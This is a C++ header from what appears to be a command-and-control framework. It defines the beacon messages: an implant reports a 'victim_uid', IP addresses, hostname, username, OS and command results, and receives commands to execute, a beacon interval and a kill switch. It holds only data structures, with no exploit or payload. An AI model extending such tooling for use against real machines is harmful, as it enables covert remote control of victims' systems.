#pragma once

#include <string>
#include <vector>

#include "Database/CommandDAO.hpp"

//-------------------------------------------------
//
//-------------------------------------------------
struct CommandResult {
    std::string command_uid;
    std::string result_data;
    int status;  // 0 = pending, 1 = success, 2 = failed
};

//-------------------------------------------------
//
//-------------------------------------------------
template <>
struct glz::meta<CommandResult> {
    using T = CommandResult;
    static constexpr auto value = glz::object(
        "command_uid", &T::command_uid,
        "result_data", &T::result_data,
        "status", &T::status
    );
};

//-------------------------------------------------
//
//-------------------------------------------------
struct BeaconRequest {
    std::string victim_uid;
    std::string internal_ip;
    std::string external_ip;
    std::string hostname;
    std::string username;
    std::string operating_system;
    std::vector<CommandResult> command_results;  // Results from previous commands
};

//-------------------------------------------------
//
//-------------------------------------------------
template <>
struct glz::meta<BeaconRequest> {
    using T = BeaconRequest;
    static constexpr auto value = glz::object(
        "victim_uid", &T::victim_uid,
        "internal_ip", &T::internal_ip,
        "external_ip", &T::external_ip,
        "hostname", &T::hostname,
        "username", &T::username,
        "operating_system", &T::operating_system,
        "command_results", &T::command_results
    );
};

//-------------------------------------------------
//
//-------------------------------------------------
struct BeaconResponse {
    std::vector<CommandDAO> commands;  // Commands to execute
    int beacon_interval;               // Seconds until next beacon
    bool should_exit;                  // Kill switch
};

//-------------------------------------------------
//
//-------------------------------------------------
template <>
struct glz::meta<BeaconResponse> {
    using T = BeaconResponse;
    static constexpr auto value = glz::object(
        "commands", &T::commands,
        "beacon_interval", &T::beacon_interval,
        "should_exit", &T::should_exit
    );
};